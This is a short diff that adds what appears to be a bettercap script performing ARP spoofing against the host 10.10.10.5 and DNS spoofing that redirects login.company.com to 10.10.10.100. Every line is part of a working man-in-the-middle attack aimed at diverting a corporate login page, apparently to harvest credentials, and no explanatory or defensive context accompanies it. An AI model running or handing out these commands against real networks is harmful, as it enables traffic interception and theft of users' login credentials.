@@ -1,0 +1,5 @@
+set arp.spoof.targets 10.10.10.5
+arp.spoof on
+set dns.spoof.domains login.company.com
+set dns.spoof.address 10.10.10.100
+dns.spoof on
